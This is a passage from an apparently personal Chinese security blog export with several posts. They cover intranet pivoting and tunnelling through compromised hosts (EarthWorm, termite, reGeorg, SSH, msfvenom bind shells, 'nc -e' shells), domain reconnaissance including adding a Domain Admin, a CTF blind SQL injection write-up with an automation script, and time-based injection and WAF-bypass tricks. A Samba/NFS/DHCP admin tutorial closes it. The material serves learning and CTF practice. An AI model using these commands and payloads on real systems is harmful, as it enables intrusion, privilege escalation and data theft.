删除某条转发规则 1netsh interface portproxy delete v4tov4 listenaddress=x.x.x.x listenport=x 然后直接连接192.168.120.8:3333就能连接到192.168.120.9:3389 Linuxiptables 123456echo 1 &gt; /proc/sys/net/ipv4/ip_forwardservice iptables stopiptables -t nat -A PREROUTING -p tcp -d 本地IP --dport 本地端口 -j DNAT --to-destination 目标IP:目标端口iptables -t nat -A POSTROUTING -p tcp -d 目标IP --dport 目标端口 -j SNAT --to-source 本地IPservice iptables saveservice iptables start 边界代理工具windowsxscoks主要参数为 1xsocks -t -p1 8085 -p2 8086 肉鸡服务器上用proxifier进行连接 EarthWorm这是一款跨平台的工具： 首先在肉鸡服务器上建立监听(socks5监听1080端口，8888是接收内网的反弹端口) 1ew_for_Win.exe -s rcsocks -l 1080 -e 8888 接着在内网机器上执行反弹命令 1ew -s rssocks -d 肉鸡服务器IP -e 8888 此时能看到肉鸡服务器上接收到了一个反弹 然后在本地攻击机上利用proxifier打通通道 此时就打通了本机和内网机器的通道了 termite termite作为earthworm的升级版，必须学一下 首先在本机（或vps）上执行监听命令 1agent_windows_x86.exe -l 888 接着在目标机器上执行连接命令 1agent_windows_x86.exe -c 192.168.1.181 -p 888 再回到本机（或vps）上执行命令 1admin_windows_x86.exe -c 127.0.0.1 -p 888 此时获取到了admin终端，可以看到有三个节点，选择第二个 123goto 2socks 1080shell 6666 这时在本机（或vps）上利用nc得到shell 1nc 127.0.0.1 6666 到此就成功反弹了socks服务器，可以利用downfile和upfile命令下载和上传文件以及其他命令进行下一步的内网漫游 如果权限较低，并且目标在两个防火墙（dmz）之间，只有web数据可以出来。此时可以利用基于http的转发与socket代理 reGeorg+proxifier下载的reGeorg包里面的内容有 将这个包上传到目标服务器的web服务器上 在肉鸡服务器上直接访问： 然后在肉鸡服务器上运行代理工具 这里需要注意的是，这里需要urllib3库，需要自行安装 然后打开proxifier设置代理服务器 然后设置代理规则 开始运行后的界面 然后就能远程连接桌面了 ssh通道ssh协议有三个很强大的命令 123ssh -CfNg -L listen_port:DST_Host:DST_port user@tunnel_hostssh -CfNg -R listen_port:DST_Host:DST_port user@tunnel_hostssh -CfNg -D listen_port user@tunnel_host -C：压缩数据传输 -f：后台认证用户密码，通常与-N连用，不用登录到远程主机 -N：不执行脚本命令，通常与-f连用 -g：允许在本地主机建立连接 -L：将本地主机的某个端口转发到远端指定机器的指定端口 -R：将远程主机的某个端口转发到本地指定机器的指定端口 -D：指定一个本地机器动态的应用程序端口转发 ssh远程转发 首先需要在公网主机上编辑配置文件 123vim /etc/ssh/sshd_config在末尾加上GatewayPorts yes 然后重启sshd 1sudo systemctl restart sshd 接着利用如下命令建立一个ssh反向隧道 在内网主机内执行命令： 1ssh -CfNg -R 3333:127.0.0.1:22 远程公网主机用户名@远程公网主机IP 在公网主机上执行命令： 1ssh -p 3333 localhost ssh本地转发 和远程隧道类似 在目标主机上执行 1ssh -CfNg -L 3333:127.0.0.1:22 本地主机用户名@本地主机IP 在肉鸡服务器上执行 1ssh -p 3333 localhost ssh维持连接 和上面的类似，只是在目标服务器上安装autossh，使用autossh命令来维持连接 ssh互联通道 除了以上的操作，我们还可以利用ssh反向隧道来使两台分别位于nat服务器后的两台主机通过一个公网IP服务器建立ssh通道连接 首先还是跟之前一样修改sshd的配置文件 然后在一台机器a上使用autossh命令连接到公网服务器 1autossh -p 22 -M 7777 -NR &apos;*:7777:localhost:22&apos; 公网服务器用户@公网服务器IP 接着在另外一台主机b上通过公网服务器的7777端口连接到另外一台nat服务器之后的机器 1ssh -p 7777 a用户@公网服务器IP ssh通道socket代理1ssh -qTfnN -D port 远程主机IP 可以看到以tcp数据形式反弹了代理 当防火墙对tcp有限制时，可以用imcp的形式进行反弹 直连shell端口转发当攻击机kali不在外网或目标在dmz里不能反弹shell 时，可通过这种直连shell然后通过http端口转发到本地的metasploit 先生成一个bind_shell 1msfvenom -p windows/x64/shell/bind_tcp LPORT=12345 -f exe -o ./shell.exe 上传到肉鸡服务器上运行 然后在攻击机kali上利用tunna工具包进行端口转发 1python proxy.py -u http://l69.254.165.5/release/conn.jsp -l 1111 -r 12345 v 这里需要注意的是，l3m0n师傅给的tunna工具包里的conn.php有点问题，理由有一个函数未经定义就直接调用了，使用是报错，所以我们这里使用的是jsp，gayhub上的tunna项目的conn.php是完整的 接着在攻击机上执行一个监听 1234use exploit/multi/handlerset payload windows/x64/shell/bind_tcpset LPORT 1111set RHOST 127.0.0.1 此时就会反弹一个shell 正向shell 12nc -e /bin/sh -lp 1234nc.exe -e cmd.exe -lp 1234 路还很长]]></content>
      <tags>
        <tag>工具</tag>
        <tag>内网渗透</tag>
        <tag>端口转发</tag>
        <tag>代理转发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磨皮皮之内网信息收集]]></title>
    <url>%2F2018%2F04%2F25%2F%E7%A3%A8%E7%9A%AE%E7%9A%AE%E4%B9%8B%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[结构分析获取当前组的计算机名 1net view 查看所有域 1net view /domain 通过计算机名获取IPv4地址 1ping -n 1 计算机名 -4 还可以用bat脚本批量获取计算机IP，这里给出l3m0n师傅的脚本 1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k %%j))) 查看域中的用户 123dsquery user或net user /domain 查看域组名称 1net group /domain 查看域管理员 1net group &quot;Domain Admins&quot; /domain 添加账号 1net user test 1234qwer. /add /domain 将普通域成员账号提升为域管理员 1net group &quot;Domain Admins&quot; test /add /domain 查看当前计算机名、全名、用户名 1net config workstation 查看域控制器 1net group &quot;Domain controllers&quot; 查询所有计算机名称 123dsquery computer或net group &quot;Domain computers&quot; /domain 跟踪路由 1tracert 192.168.120.67 查看共享 1net view \\192.168.120.67 ###定位域控 查看域时间及域服务器名字 1net time /domain 通过nslookup来查询域服务器名及IP 1Nslookup -type=SRV _ldap._tcp. 通过ipconfig配置查找dns地址 1ipconfig/all 扫描分析利用nbtsat命令获取mac地址，此命令可以查询域内其他机器的mac地址，前提是知道其IP 1nbtstat -A 192.168.120.67 或者直接使用nbtscan扫描网段 1nbtscan.exe 192.168.120.0/24 端口扫描insightScan proxy_socket后直接利用proxychains工具代理扫描 1proxychains python scanner.py 192.168.120.0/24 -N 路还很长]]></content>
      <tags>
        <tag>信息收集</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ddcft_sql注入]]></title>
    <url>%2F2018%2F04%2F21%2Fddcft-sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[题目挺有意思，但是如果没有扎实的脚本功，会花费非常多非常多时间 前期准备进入题目，页面提示 1非法链接，只允许来自 123.232.23.245 的访问 加个xff头就行，但是在burp suite进行注入是不行的，因为sig参数是一个js文件生成的加密字符串，只有在浏览器js才会执行。并且time参数是当前时间戳，不能在repeater里重复发包，会显示time error 此时可以利用火狐的modify header value插件，此时进入页面： 漏洞发现题目有三个输入框，但是测试过后发现，这三个框并不存在sql注入，于是从源码下手。网页邮件源码我们发现了一个隐藏的提交表单 将hidden改为text，网页将会显示这个post提交框，经过以下简单测试发现存在基于bool的sql注入： 1234561&apos; 无回显1&apos;or&apos;1 被waf拦截1&apos;||&apos;1 回显正常1&apos;||&apos;0 无回显1&apos;||(1=1)&apos;1 回显正常1&apos;||(1=0)&apos;1 无回显 可以在括号中写入注入语句 经简单测试发现union，database()被过滤 漏洞利用11&apos; || (select 1)||&apos;1 只有一列字段数 11&apos; || (select(substring((select schema_name from information_schema.schemata limit 0,1),1,1))=&apos;i&apos;)||&apos;0 得到数据库为information_schema 11&apos; || (select(substring((select schema_name from information_schema.schemata limit 1,1),1,1))=&apos;d&apos;)||&apos;0 得到数据库为ddctf 11&apos; || (select(substring((select table_name from information_schema.tables where table_schema=(select schema_name from information_schema.schemata limit 1,1) limit 0,1),1,10))=&apos;ctf_key10&apos;)||&apos;0 得到表名为ctf_key10 11&apos; || (select(substring((select column_name from information_schema.columns where table_name=&apos;ctf_key10&apos; limit 0,1),1,8))=&apos;secvalue&apos;)||&apos;0 得到列名为secvalue 11&apos; || (select(substring((select group_concat(secvalue)from ctf_key10),1,23))=&apos;ddctf&#123;jlecrhqjybcbvbrc&#125;&apos;)||&apos;0 得到flag为：ddctf{jlecrhqjybcbvbrc} 这里有个坑，提交的需要全大写 DDCTF{JLECRHQJYBCBVBRC} 书写脚本手工盲注实在太痛苦，上脚本轻松的多，可是我尝试了下没写出来，这里贴出史努比小可爱的py tmp.html 123456789101112131415161718192021222324&lt;script type="text/javascript" src="math.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; function signGenerate(obj, key) &#123; var str0 = ''; for (i in obj) &#123; if (i != 'sign') &#123; str1 = ''; str1 = i + '=' + obj[i]; str0 += str1 &#125; &#125; return hex_math_enc(str0 + key) &#125;; var obj = &#123; id: "", title: "", author: "%s", date: "", time: parseInt(new Date().getTime() / 1000) &#125;; var key="\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165"; var sign = signGenerate(obj, key); document.write("sig=" + sign + "###time=" + obj.time);&lt;/script&gt; dd_web1.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#! /usr/bin/env python3# Author : sn00py# Date : 4/13 16:33# Email: 3022235906@qq.com# Comment: no commentfrom selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsimport reimport requestschrome_options = Options()chrome_options.add_argument("--headless")chrome_options.add_argument("--disable_gpu")chrome_options.add_argument("--window-size=1920,1080")chrome_options.binary_location = r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"driver_path = r"D:\software\python35\chromedriver.exe"def enc_payload(payload): d = webdriver.Chrome( executable_path=driver_path, chrome_options=chrome_options ) d.implicitly_wait(30) d.set_page_load_timeout(30) local = r"D:\software\phpstudy\WWW\ctf\test.html" tmp = r"D:\software\phpstudy\WWW\ctf\tmp.html" with open(tmp) as f: content = f.read() % payload with open(local, "w+") as f: f.write(content) d.get(local) data = re.search(pattern=r"sig=(.+)###time=(.+)&lt;/body&gt;", string=d.page_source) sig = data.group(1) time = data.group(2) d.close() return sig, timedef sqli(): flag = "[*]" for i in range(1, 40): print('number %s...' % i) for s in range(32, 127): author = "admin' &amp;&amp; ascii(substr((select secvalue from ctf_key9 limit 1),%s,1))=%s#" % (i, s) # print(author) sig, time = enc_payload(author) data = &#123; "id": "", "title": "", "date": "", "author": author &#125; url = "http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig=%s&amp;time=%s" % (sig, time) headers = &#123; "X-Forwarded-For": "123.232.23.245", &#125; try: resp = requests.post(url=url, data=data, headers=headers) if "admin" in resp.text: flag += chr(s) break except Exception as e: print(e) continue print(flag)if __name__ == "__main__": sqli() 不得不佩服史努比师傅。顺带再次吐槽下这道注入题，对我们这种手（菜）工（鸡）的人太不友好 路还很长]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于延时注入的高级技巧]]></title>
    <url>%2F2018%2F04%2F08%2F%E5%85%B3%E4%BA%8E%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%84%E9%AB%98%E7%BA%A7%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[笛卡尔积延时注入前段时间l3m0n师傅发了一道pwnhub上的sql注入题 主要代码如下： 123456789101112131415&lt;?phprequire 'conn.php';$id = $_GET['id'];if(preg_match("/(sleep|benchmark|outfile|dumpfile|load_file|join)/i", $_GET['id']))&#123; die("you bad bad!");&#125;$sql = "select * from article where id='".intval($id)."'";$res = mysql_query($sql);if(!$res)&#123; die("404 not found!");&#125;$row = mysql_fetch_array($res, MYSQL_ASSOC);mysql_query("update view set view_times=view_times+1 where id = '".$id." '");?&gt; 可以看到过滤了两个用于延时注入的函数sleep和benchmark。基本的延时注入尝试了下，没有成功，然后去l3m0n师傅博客看了下，找到了一篇关于heavy-query的文章 原理： 所谓重查询，就是查询一些量比较大的表做笛卡尔积运算，导致延时，类似： 1select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C 利用and的性质，当and的两个值都为真时，执行后面的语句。否则不执行 我本地搭建的mysql某表结构为： 1234567mysql&gt; select * from admin;+----------+----------+----+| username | password | id |+----------+----------+----+| user | password | 1 |+----------+----------+----+1 row in set (0.00 sec) 构造语句： 1select * from admin where id=1 and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C); 出现延时， 而构造语句： 1select * from admin where id=1 and 1=2 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C); 则没有延时 需要注意的是：在本地数据库中，当构造的笛卡尔积运算的列数和表列数不一致时，会直接查出数据，也就是说，在实战中，将不会查出数据 爆数据库名长度(x为变量)： 1select * from admin where id=1 and (SELECT length(database()) limit 0,1) = x and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C); 爆库名(x为变量)： 1select * from admin where id=1 and (select(MID(database(),1,1)) = &apos;x&apos;) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C); 剩下的就是注入一条龙了 除了以上的“三列”，我们还可以使用‘两列一表“和”两列一库“，分别为 1select * from admin where id=1 and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C); 和 1select * from admin where id=1 and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.schemate C); 高计算量原理： 利用rpad()填充函数，由于一个rpad()函数填充的最大位为999999，延时很短，所以可以再利用concat()函数将几个rpad()函数连接起来，增加延时 1concat(rpad(1,999999,&apos;a&apos;), rpad(1,999999,&apos;a&apos;), rpad(1,999999,&apos;a&apos;),......) rlike &apos;(a.*)+(a.*)+....+b&apos; 1234567mysql&gt; select concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) rlike &apos;(a.*)+(a.*)+b&apos;;+----------------------------------------------------------------------------------------+| concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) rlike &apos;(a.*)+(a.*)+b&apos; |+----------------------------------------------------------------------------------------+| 0 |+----------------------------------------------------------------------------------------+1 row in set (0.26 sec) 可以看到三个rpad拼接就有0.26s延时，可以用多个rpad拼接达到更长延时 在Windows上查询的时候结果为null，因为版本原因。mac的mysql版本为5.7.21，Windows的mysql版本为5.5.53 get_lock延时注入原理：在一个session中可以先锁定一个变量： 1select get_lock(&apos;test&apos;,1); 然后利用另一个session在此执行这个函数： 1select get_lock(&apos;test&apos;,5); 此时就会有五秒的延迟 如下图所示： 当在同一个session执行5秒延迟语句时并不会延迟，我们另外打开个mysql会话，以新的session执行，发现成功延时5秒： 爆数据库名长度(x为变量)： 1234567mysql&gt; select * from admin where id=1 and (SELECT length(database()) limit 0,1) = 4 and get_lock(&apos;1&apos;,1);+----------+----------+----+| username | password | id |+----------+----------+----+| user | password | 1 |+----------+----------+----+1 row in set (0.00 sec) 接着换一个session进行延时注入 12mysql&gt; select * from admin where id=1 and (SELECT length(database()) limit 0,1) = 4 and get_lock(&apos;1&apos;,5);Empty set (5.01 sec) 以下是转自长亭科技的tamper： 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/env python"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'doc/COPYING' for copying permission"""from lib.core.enums import PRIORITY__priority__ = PRIORITY.HIGHESTdef dependencies(): passdef tamper(payload, **kwargs): """ Replaces instances like 'SLEEP(A)' with "get_lock('do9gy',A)" Requirement: * MySQL Tested against: * MySQL 5.0 and 5.5 Notes: * Useful to bypass very weak and bespoke web application firewalls that filter the SLEEP() and BENCHMARK() functions &gt;&gt;&gt; tamper('SLEEP(2)') "get_lock('do9gy',2)" """ if payload and payload.find("SLEEP") &gt; -1: while payload.find("SLEEP(") &gt; -1: index = payload.find("SLEEP(") depth = 1 num = payload[index+6] newVal = "get_lock('do9gy',%s)" % (num) payload = payload[:index] + newVal + payload[index+8:] return payload 路还很长]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磨皮皮之Linux下服务器配置与管理]]></title>
    <url>%2F2018%2F04%2F08%2F%E7%A3%A8%E7%9A%AE%E7%9A%AE%E4%B9%8BLinux%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[实验环境是在Centos下 Linux基础用户与组管理与用户和组信息相关的文件 文件 说明 /etc/passwd 维护用户账号信息 /etc/shadow 维护用户口令有关的信息 /etc/group 维护组信息 /etc/gshadow 维护组加密形式的口令 /etc/default/useradd 创建用户缺省信息 /etc/skel 创建新用户时需拷贝的缺省文件所存放的位置 /etc/login.defs 包含全系统设置，在创建新用户与组时使用 网络环境设置网卡的相关配置信息保存在/etc/sysconfig/network-scripts子目录下的某文件中 指定本地所需DNS服务器在Linux系统中，为了实现解析域名，就需要有可用的DNS服务器。因此可以在/etc/resolv.conf文件中指定所需DNS服务器的IP地址，可以设定多个DNS地址。 重启网络配置，是其生效1/etc/rc.d/init.d/nerwork restart 或 1/sbin/service network restart Samba服务器Samba概述Windows之间可以基于NetBios完成，Linux和Windows间可以基于NetBios协议下的SMB网络协议完成 Samba简介samba的主要功能有下： （1）基于NetBios协议，类似Windows的文件和打印机共享协议。在Linux中，利用samba服务完成共享Linux系统中的文件和打印机资源 （2）能够解析NetBios的主机名，以主机名的形式实现访问主机 （3）Linux能够提供SMB客户端功能，利用smbclient程序完成类似FTP的方式访问共享资源，使用put、get命令实现上传和下载。还可以利用smbmount命令完成挂载共享，即类似于Windows中的逻辑映射到驱动器 samba的SMB协议该协议可以建立在TCP/IP上，也可以用于其他网络协议（例如ipx和NetBEUI）上 ipx是互联网数据包交换协议，在局域网用的较多的就是ipx/spx协议，ipx协议就类似ip/tcp协议中的ip协议 NetBEUI（用户拓展接口协议）是NetBios协议的增强版本 与samba服务相关的文件1）/etc/samba/smb.conf文件为主配置文件，由以下两部分组成： （1）global settings：该部分为全局设置，其设置项是针对所有共享资源的设置 （2）share definitions：该部分为共享设置，只针对当前共享资源设置 ​ 设置完后，需要用testparm命令检查smb.conf配置文件内是否存在语法错误 2）/etc/samba/lmhosts：此文件便于解析NetBios的主机名 3）/etc/samba/smbusers：用于控制用户映射，并且通常在Windows与Linux之间进行。两个系统拥有不同的用户账号，通过将不同用户的账号映射成为一个用户，就可以直接使用 Windows账号进行访问了 4）/etc/samba/smbpasswd：用于保存访问samba服务的用户名及加密后的密码。刚安装好的samba服务，需要用smbpasswd命令建立并生成该文件 5）/var/log/samba：目录中存放samba服务日志 Samba服务的安装和启动samba服务软件的安装直接利用yum install samba或者apt-get samba命令进行安装 自启动和停止自启动12systemctl enable smbsystemctl disable smb 向防火墙添加例外端口在centos中，系统默认开启了防火墙，默认情况下，139/tcp,139/udp,445/tcp,445/udp端口是被拦截的，因此需要使用命令firewall-cmd添加例外端口，例如： 1firewall-cmd --permanent --add-port = 139/udp —permanent命令是永久有效的意思 smb.conf配置文件详解准备配置smb.conf文件是Linux提供共享服务的必须步骤，但是要使提供服务生效，还需要确信系统中NetBios协议和Microsoft协议建立在tcp/ip协议上的tcp和udp端口139和445端口开启，可以直接查看/etc/services文件即可看到开启的端口号 详解smb.conf文件内容global settings workgroup：设置网上邻居工作组server string：设置服务器注释netbios name：设置服务器显示主机名interfaces：设置samba服务器侦听接口和地址hosts allow：设置允许的主机或地址访问smbmax protocol：设置支持的协议，缺省为NT1max connections：设置最大连接数log file：设置日志存储文件名max log size：设置日志文件最大长度security：可以设置为user、share、serverpassdb backend：当security设置为user时，保存用户及密码方式security：如果samba是域成员，需要将security设置为domainwins server：设置wins服务器地址load printers：设置自动装载打印机共享printcap name：设置打印机配置文件printcap name：设置打印机共享名 share definitions comment：注释valid users：设置服务器上的有效用户path：设置指定共享目录的绝对路径writable：设定是否只写browseable：设置是否可浏览public：设置是否所有用户都可以访问guest ok：设置是否可以匿名访问read list：设置只读用户或组write list：设置只写用户或组 samba客户账号建立如果smb.conf配置文件的全局配置部分中被设定为security=user时，需要在后面设定用户身份验证所需的配置选项，即 123passdb backend = smbpasswdsmb encrypt = defaultsmb passwd file=/etc/samba/smbpasswd 使用命令smbpasswd或pdbedit完成账号建立问题。例如需要teacher.stu1用户可以访问samba服务器，前提是这两个账号必须是属于/etc/passwd中的账号。 1234567[root]# useradd -g students stu1[root]# smbpasswd -a stu1New SMB password:Retype new SMB password:Added user stu1[root]# pdbedit -Lstu1:password passwd backend标示后台用户密码的存储方式，有三种：smbpasswd、tdbsam、ldapsam samba服务器配置实例samba作为文件服务器的smb.conf配置例子：某公司有一个工作组为Office，共享目录为/mnt/resurce，共享名为public_files，允许所有员工访问。其次为三个员工分配了3个私人Linux账号 1.创建共享目录及用户 1mkdir -p /mnt/resource 2.创建系统用户 12groupadd office //创建用户组useradd -g office jack（John、petter） //创建用户 3.完成smb.conf /etc/samba/smb.conf主配置文件参考： 1234567891011121314151617181920212223242526272829[global]workgroup = Officeserver string = Samba Server Version %vnetbios name = FILE_SERVERhosts allow = 127. 192.168.1. 192.168.2.max protocol = SMB2log file = /var/log/samba/log.%m# maximum size of 50KB per log file,then rotate:max log size = 50security = userpassdb backend = tdbsam[public_files]comment = Public Stuff path = /mnt/resource guest ok = yes writable = yes directory mask = 0777 force directory mode = 0777 directory security mask = 0777 force directory security mode = 0777 create mask = 0777 force create mode = 0777 security mask = 0777 force security mode = 0777[homes]comment = Home Directoriesbrowseable = yeswritable = yesvalid users = john,jack,peter 共享相关权限设置由于centos系统默认采用selinux，如果直接提供共享，则客户端是无法访问的。因为创建的共享目录的selinux和samba默认的selinux不匹配，需要更改共享目录的selinux值 查看目录的selinux 1ls -Zd /mnt/resource/ 可以看到子目录整个文件的selinux类型为mnt_t，而samba的selinux类型为samba_share_t 更改目录的selinux 12chcon -R -t samba_share_t/mnt/resourcechmod -R o = rw /mnt/resource 这样就把/mnt/resource/及其目录下的子目录和文件的selinux类型更改为samba的类型了 更改用户子目录的selinux类型 1chcon -R -t samba_share_t jack john peter 这样就把/home目录下的三个用户的子目录的selinux类型给修改了 重启服务并确认端口开放 12345systemctl restart smbfirewall-cmd --permanent --add-port = 139/udpfirewall-cmd --permanent --add-port = 139/tcpfirewall-cmd --permanent --add-port = 445/udpfirewall-cmd --permanent --add-port = 445/tcp samba客户linux客户端利用两条命令即可访问samba共享资源 1.smbclient 此命令属于samba-client软件包，可以在线安装 12smbclient -L 主机名或IP -U 用户名smbclient 主机名或IP/共享目录 -U 用户名 前者是查看主机上的共享，后者是以用户身份登录并进入共享目录 2.mount和umount命令 在Windows中可以将共享映射到本地的驱动器。在Linux中可以使用mount命令将共享挂载到本地系统的目录下，同时也可以使用umount命令卸载挂载 12mount 主机名或地址/共享目录 -o 选项umount 挂载点 Windows客户端先在网卡的本地地址配置中启用NetBios服务，然后防火墙开放TCP/UDP协议端口，接着在运行窗口中输入\\samba服务器地址，或在资源管理的输入框中输入\\samba服务器地址，即可弹出登录窗口 NFS服务器NFS概述nfs是一种网络文件系统服务，但是由于它的认证机制是基于IP的，所以容易收到攻击 nsf协议本身不具备数据传输能力，必须通过RPC协议来传输数据，所以portmap服务一定要打开。目前使用NFS服务需要至少开启以下三个系统守护进程： （1）rpc.nfsd：该守护进程数据nfs服务的基本守护进程，主要完成客户端是否能够接入nfs服务器的管理 （2）rpc.mountd：这是RPC安装守护进程，主要功能是完成nfs文件系统的管理。该守护进程能够对接入nfs服务器的客户进行授权验证，通过读取/etc/exports文件的配置来对比客户是否有权限访问共享资源 （3）portmap：该守护进程的主要功能是完成进行端口映射的管理，应用于RPC服务，而NFS需要RPC服务器，因此通过端口映射后，为客户提供接入服务器的端口位置。侦听客户的接入连接。可以采用两种方式启动portmap服务：一是通过ntsysv命令开启自动启动portmap服务。二是在超级用户下直接启动 1/etc/rc.d/init.d/portmap start 要查看NFS是否在运行中，可通过命令rpcinfo -p得到，如果所显示的结果中没有nfs和mountd项出现，标示还没启动 与NFS相关的组件除上述外，还有： rpc.statd和rpc.lockd：负责处理客户与服务器之间的文件锁定问题和锁定恢复 rpc.rquotad提供了NFS和配额管理程序之间的接口 NFS服务忌语RPC机制下采用C/S模式完成NFS资源共享，在服务器上只需将共享的目录设置为export输出，NFS客户端再利用mount命令将共享目录挂载到本地某个目录中，即可实现对共享资源的操作 配置NFS服务器NFS服务器的安装通过rpm -q命令检查是否安装，还可以通过rpm -qf命令检查启动nfs服务的文件属于哪个软件包。不过linux默认缺省安装NFS服务器，需要我们手动安装 配置/etc/exports文件设置NFS服务器的过程需要先建立或修改/etc/exports文件，此文件定义了服务器上的哪几个部分与网络其他部分共享，共享的规则、访问权限等 1./etc/exports文件格式 123#First Share/directory_to_export client_host1(options) client_host2(options)\ client_host3(options) client_host4(options) 其中“directory_to_export”标示将NFS服务器的本地目录共享输出，而且必须是绝对路径。“client_host”表示客户主机名或IP，必须与共享目录在同一行，写不下可以用“\”符号提行写。options表示选项 上面的options说明： rw 设置输出目录可读写，缺省值 ro 只读 root_squash 将root用户及所属用户组都映射为NFS服务的本地NFS匿名用户或用户组（）默认 no_root_squash 接受客户端的root用户或用户组，不进行映射为nfs匿名用户或用户组 all_squash 将远程客户端访问的所有普通用户或所属用户组都映射为nfs匿名用户或用户组 no_all_squash 与上相反 anonuid=xxx和anongid-gids=xxx 将客户端请求的所有用户或用户组都映射为NFS服务器的本地用户账户或用户组，比如：anonuid=50，要求客户端访问/home/joe共享输出目录的时候，将所有请求账号都映射为服务器本地joe用户账号（uid=50） secure 限定客户端使用的端口号必须要域1024 insecure 允许客户端使用的端口号大于1024 sync 将数据同步写入内存缓冲区与磁盘，便于保证数据一致性，但是效率低 async 将数据先保存在内存缓冲区，必要时才写入磁盘 wdelay 检查是否有相关的写操作，如果有则将这些写操作一起执行，可提高效率（默认值） no_wdelay 与sync配合使用，解决有写操作时则立即执行 subtree_check 若输出目录是一个子目录，则NFS服务器将会检查父目录的权限（默认值） no_subtree_check 与上面的含义相反，不检查，提高效率 2.exports配置举例 12345/var/exports/soft john.Linuxstudy.com(rw,sync) *.edu.cn(ro) \ 192.168.6(rw,async,no_root_squash)/var/exports/movie 192.168.2.0/24(ro,anonuid=233,no_subtree_chech) \ 192.168.3.0/24(rw,sync,anonuid=233)/var/exports/upload 192.168.8.*(rw,insecure,sync,no_wdelay,no_subtree_check) 3.采用exportfs命令把配置文件通知NFS服务器进程 当建立好/etc/exports文件后，不用重新启动nfs守护进程，可以使用命令exportfs来通过告知nfs服务器进程重新读取配置信息，通过该命令还可以将/etc/exports中的某一项共享告诉nfs进程生效或失效 -a 输出/etc/exports文件里的所有共享项 -r 重新输出/etc/exports文件里的所有共享项，并立即失效 -u 停止输出某一共享项 -v 显示执行命令的结果信息 4.测试nfs服务输出状态 （1）直接使用exportfs命令，即可得到输出状态 （2）使用showmount命令 12345showmount [选项] nfs服务IP或主机名选项： -a：显示所指定的nfs服务器的所有客户端主机及其所连接的目录 -d：显示指定的nfs服务器中已经被客户端连接的所有共享输出目录 -e：显示指定的nfs服务器上所有共享输出目录列表 NFS服务启停管理1.启停管理： NFS正常工作，需要portmap和nfs两个守护进程同时运行，并且portmap必须比nfs先启动。停止时必须先停止nfs守护进程后再停止portmap 2.系统启动时自启动服务： 应用程序-&gt;系统设置-&gt;服务器设置-&gt;服务，然后在弹出的窗口中选中nfs和portmap（用空格键选中） NFS客户端使用mount和umount命令和samba服务器类似 编辑/etc/fstab文件在etc/fstab中，可以设定自动挂载文件系统，也包括NFS服务 在文件末尾加上： 1192.168.1.6:/var/exports/soft /mnt/soft nsf default 0 0 DHCP服务器Linux下的DHCP概述Linux下的DHCP服务和windows下的一样，除了能够为客户机分配IP外，同时还可以将预定的默认网关、DNS服务器地址、wins服务器地址传送给客户机，为客户提供完整的网卡地址信息 如果客户机的DHCP请求在局域网内没有任何DHCP服务器响应，此时若局域网网关（或路由器）设定了DHCP中继代理，便可以将DHCP请求包转发给指定的跨网络的DHCP服务器 DHCP服务配置准备工作配置DHCP服务器DHCP服务器的IPv4主配置文件时/etc/dhcp/dhcpd.conf，IPv6的主配置文件时/etc/dhcp/dhcpd6.conf。默认情况下这两个文件是空的，需要我们自己从/usr/share/doc/dhcp*/目录下拷贝 dhcpd.conf.example或 dhcpd6.conf.example后，进行修改DHCP内容实现配置 1cp -vf /usr/share/doc/dhcp-x.x.x/dhcpd.conf.example /etc/dhcp/dhcpd.conf 详解DHCP配置文件的格式配置文件包括三部分，声明、参数、选项，每一行设定完毕后用分号结束 1234全局选项/参数; 声明&#123; 该声明的局部选项/参数; &#125; 1.参数 dns-update-style 类型 设定DHCP与DNS间互动更新模式，只能用于全局 default-lease-time 整数 指定客户的缺省租约期限，秒 max-lease-time 整数 指定组大租约期限 hardware 网卡接口类型 网卡Mac地址 指定客户网卡接口类型和Mac地址 server-name 主机名 通知DHCP客户服务器名称 get-lease-hostnames flag 检查客户端使用的IP地址，flag缺省为假 fixed-address IP地址 给客户分配一个固定的IP地址，与hardware配合使用 authoritative 拒绝不正确的IP的请求 2.声明部分 shared-network 名称 {….} 定义DHCP超级作用域 subnet 网络号 